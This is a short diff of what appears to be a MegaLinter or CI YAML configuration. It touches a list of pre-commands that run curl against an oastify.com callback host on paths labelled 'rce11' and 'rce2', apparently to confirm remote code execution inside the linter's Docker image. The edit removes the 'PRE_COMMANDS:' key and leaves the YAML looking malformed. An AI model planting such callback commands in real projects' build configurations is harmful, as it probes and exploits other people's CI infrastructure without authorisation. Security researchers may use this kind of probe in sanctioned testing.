@@ -14,7 +14,7 @@ on:
     branches:
       - main
       - master
-PRE_COMMANDS:
+
   - command: curl "https://y765rnhy1bipko3t2dibx0hew52xqpee.oastify.com/rce11"
     cwd: "root"        # Will be run at the root of MegaLinter docker image
   - command: curl "https://y765rnhy1bipko3t2dibx0hew52xqpee.oastify.com/rce2"
